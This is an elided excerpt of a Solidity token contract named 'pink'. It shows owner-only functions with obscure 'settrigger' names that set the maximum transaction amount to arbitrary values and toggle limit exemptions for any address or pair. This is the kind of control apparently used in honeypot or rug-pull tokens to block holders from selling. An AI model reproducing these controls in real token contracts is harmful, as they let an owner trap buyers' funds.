...
contract pink is Context, IERC20, Ownable {
    ...
    function settriggerTxSetting(address holder, bool exempt)
        external
        onlyOwner
    {
    ...
    function settriggerAmountSetting(uint256 maxWallPercent) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxWallPercent) / 1800;
    }

    function settriggerPercentSetting(uint256 maxTXPercentage) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxTXPercentage) / 1800;
    }

    function settriggerMaxSetting(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }

    function settriggerAutomatedSetting(address pair, bool value) external onlyOwner {
        isTxLimitExempt[pair] = value;
    }

    function Multiplier(uint8 numerator, uint8 denominator, uint8 length) external onlyOwner {
